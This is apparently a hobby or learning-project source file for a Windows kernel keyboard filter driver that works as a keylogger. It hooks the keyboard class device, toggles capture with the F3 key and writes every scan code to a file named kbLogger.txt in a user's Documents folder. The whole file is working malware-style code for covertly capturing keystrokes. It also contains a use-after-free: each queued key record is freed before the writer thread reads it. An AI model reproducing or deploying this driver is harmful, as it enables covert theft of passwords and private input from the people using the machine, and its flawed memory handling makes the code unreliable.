#include <ntddk.h>
#include <ntddkbd.h>

#pragma warning(disable:4996)

typedef bool BOOL;

typedef struct {
	PDEVICE_OBJECT lowerKbdDev;
	LIST_ENTRY queueHead;
	KSPIN_LOCK queueLock;
	HANDLE pFileHandle;
	PETHREAD pThread;
	KSEMAPHORE semQueue;
	BOOL threadTerminated;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

typedef struct {
	KEYBOARD_INPUT_DATA key;
	LIST_ENTRY entry;
} KEY_DATA;

void DriverUnloadRoutine(PDRIVER_OBJECT);
NTSTATUS DriverDispatchRoutine(PDEVICE_OBJECT, PIRP);
NTSTATUS DispatchRead(PDEVICE_OBJECT DevObj, PIRP irp);
NTSTATUS ReadComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
void SleepKernel(ULONG milliseconds);
VOID w2f(PVOID StartContext);

ULONG key_pending;
BOOL fW2f;

extern "C"
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;
	key_pending = 0;
	fW2f = false;

	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
		DriverObject->MajorFunction[i] = DriverDispatchRoutine;
	}

	DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	DriverObject->DriverUnload = DriverUnloadRoutine;
	
	PDEVICE_OBJECT devObj;
	status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, true, &devObj);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device\n"));
		return status;
	}
	devObj->Flags |= DO_BUFFERED_IO | DO_POWER_PAGABLE;
	devObj->Flags &= ~DO_DEVICE_INITIALIZING;

	PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)devObj->DeviceExtension;
	RtlZeroMemory(pDevExt, sizeof(DEVICE_EXTENSION));

	UNICODE_STRING targetDev = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");
	status = IoAttachDevice(devObj, &targetDev, &pDevExt->lowerKbdDev);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to attach device\n"));
		return status;
	}
	
	OBJECT_ATTRIBUTES fObjAttr;
	UNICODE_STRING fName = RTL_CONSTANT_STRING(L"\\??\\C:\\Users\\rdavini\\Documents\\kbLogger.txt");
	IO_STATUS_BLOCK fIoStatusBlock;
	InitializeObjectAttributes(&fObjAttr, &fName, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = ZwOpenFile(&pDevExt->pFileHandle, GENERIC_WRITE, &fObjAttr, &fIoStatusBlock, FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to open file\n"));
		return status;
	}

	InitializeListHead(&pDevExt->queueHead);
	KeInitializeSpinLock(&pDevExt->queueLock);
	KeInitializeSemaphore(&pDevExt->semQueue, 0, MAXLONG);

	HANDLE hThread;
	status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, w2f, pDevExt);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create thread\n"));
		return status;
	}

	status = ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pDevExt->pThread, NULL);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to open pointer to thread obj\n"));
		return status;
	}

	ZwClose(hThread);
	return status;
}

VOID w2f(PVOID StartContext) {
	UNREFERENCED_PARAMETER(StartContext);
	PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)StartContext;
	IO_STATUS_BLOCK fIoStatusBlock;

	while (true) {		
		KeWaitForSingleObject(&pDevExt->semQueue, Executive, KernelMode, FALSE, NULL);

		if (pDevExt->threadTerminated) {
			break;
		}

		PLIST_ENTRY entry2 = ExInterlockedRemoveHeadList(&pDevExt->queueHead, &pDevExt->queueLock);
		KEY_DATA * kData = CONTAINING_RECORD(entry2, KEY_DATA, entry);


		ZwWriteFile(pDevExt->pFileHandle, NULL, NULL, NULL, &fIoStatusBlock, &kData->key, sizeof(KEYBOARD_INPUT_DATA), 0, 0);
	}
	PsTerminateSystemThread(STATUS_SUCCESS);
}

void SleepKernel(ULONG milliseconds)
{
	LARGE_INTEGER interval;

	// Convert milliseconds to 100-nanosecond intervals
	interval.QuadPart = -(LONGLONG)milliseconds * 10000;

	// Delay execution of the current thread
	KeDelayExecutionThread(KernelMode, FALSE, &interval);
}

void DriverUnloadRoutine(PDRIVER_OBJECT DriverObject) {
	PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension;

	pDevExt->threadTerminated = true;
	IoDetachDevice(pDevExt->lowerKbdDev);
	
	while (key_pending) {
		KdPrint(("pending_key: %d\n", key_pending));
		SleepKernel(1000);		
	}
	
	ZwClose(pDevExt->pFileHandle);
	ObDereferenceObject(pDevExt->pThread);

	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS DriverDispatchRoutine(PDEVICE_OBJECT DevObj, PIRP irp) {
	PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)DevObj->DeviceExtension;

	IoSkipCurrentIrpStackLocation(irp);
	return IoCallDriver(pDevExt->lowerKbdDev, irp);
}

NTSTATUS DispatchRead(PDEVICE_OBJECT DevObj, PIRP irp) {
	PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)DevObj->DeviceExtension;
	
	IoCopyCurrentIrpStackLocationToNext(irp);
	
	key_pending++;

	IoSetCompletionRoutine(irp, ReadComplete, pDevExt, true, true, true);
		
	return IoCallDriver(pDevExt->lowerKbdDev, irp);
}

NTSTATUS ReadComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
	UNREFERENCED_PARAMETER(DeviceObject);

	PDEVICE_EXTENSION pDevExt = (PDEVICE_EXTENSION)Context;

	if (Irp->IoStatus.Status == STATUS_SUCCESS) {
		//KdPrint(("Read Complete\n"));
		PKEYBOARD_INPUT_DATA input = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;

		if (input->MakeCode == 0x003D && input->Flags) {
			fW2f = !fW2f;
			KdPrint((fW2f ? "on\n" : "off\n"));
		}

		if (fW2f && input->MakeCode != 0x003D) {
			KdPrint(("input: %d \n", input->MakeCode));

			KEY_DATA* entry = (KEY_DATA*)ExAllocatePoolWithTag(NonPagedPool, sizeof(KEY_DATA), 'ktag');
			RtlZeroMemory(entry, sizeof(KEY_DATA));
			entry->key.ExtraInformation = input->ExtraInformation;
			entry->key.Flags = input->Flags;
			entry->key.MakeCode = input->MakeCode;
			entry->key.Reserved = input->Reserved;
			entry->key.UnitId = input->UnitId;

			ExInterlockedInsertTailList(&pDevExt->queueHead, &entry->entry, &pDevExt->queueLock);
			KeReleaseSemaphore(&pDevExt->semQueue, 0, 1, FALSE);
			ExFreePoolWithTag(entry, 'ktag');
		}
		key_pending--;
	}

	if (Irp->PendingReturned) {
		IoMarkIrpPending(Irp);
	}

	return Irp->IoStatus.Status;
}